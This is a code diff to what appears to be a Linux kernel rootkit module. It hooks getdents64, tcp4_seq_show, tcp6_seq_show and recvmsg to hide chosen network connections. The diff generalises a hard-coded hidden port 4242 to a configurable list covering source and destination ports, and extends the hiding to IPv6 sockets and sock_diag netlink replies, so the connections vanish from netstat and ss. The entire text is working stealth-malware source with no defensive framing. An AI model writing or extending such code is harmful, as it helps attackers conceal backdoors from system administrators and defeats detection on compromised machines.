@@ -1,8 +1,10 @@
 #include "hide.h"
+
 #include "hide_api.h"
 
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
+asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
 asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;
 
 asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
@@ -104,15 +106,42 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
-asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v) {
-    struct sock *sk = v;
+static bool hide_sock_ports(struct sock *sk)
+{
+    struct inet_sock *inet = inet_sk(sk);
+    char port_str[6];
 
+    // Check source port
+    snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_sport));
+    if (port_contains(port_str))
+        return true;
+
+    // Check dest port
+    snprintf(port_str, sizeof(port_str), "%u", ntohs(inet->inet_dport));
+    if (port_contains(port_str))
+        return true;
+
+    return false;
+}
+
+asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v)
+{
     if (v != SEQ_START_TOKEN) {
-        if (sk->sk_num == 0x1092) // 4242
+        struct sock *sk = v;
+        if (hide_sock_ports(sk))
             return 0;
     }
-
     return __orig_tcp4_seq_show(seq, v);
+}
+
+asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v)
+{
+    if (v != SEQ_START_TOKEN) {
+        struct sock *sk = v;
+        if (hide_sock_ports(sk))
+            return 0;
+    }
+    return __orig_tcp6_seq_show(seq, v);
 }
 
 // Be careful. Problems with older versions of the kernel.
@@ -185,11 +214,19 @@ asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
         }
 
         // For each inet‐diag message check the port (source)
-        // 4242 for now lol
         if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY) {
             struct inet_diag_msg *d = NLMSG_DATA(nlh);
             int sport = ntohs(d->id.idiag_sport);
-            if (sport == 4242)
+            int dport = ntohs(d->id.idiag_dport);
+
+            // Check
+            char port_str[8];
+            snprintf(port_str, sizeof(port_str), "%u", sport);
+            if (port_contains(port_str))
+                continue;
+            
+            snprintf(port_str, sizeof(port_str), "%u", dport);
+            if (port_contains(port_str))
                 continue;
         }
 
@@ -201,6 +238,7 @@ asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
     // Back to user space
     size_t err = copy_to_user(kv.iov_base, out, out_len);
     if (err) {
+        // Nothing yet
     }
 
     kfree(in);
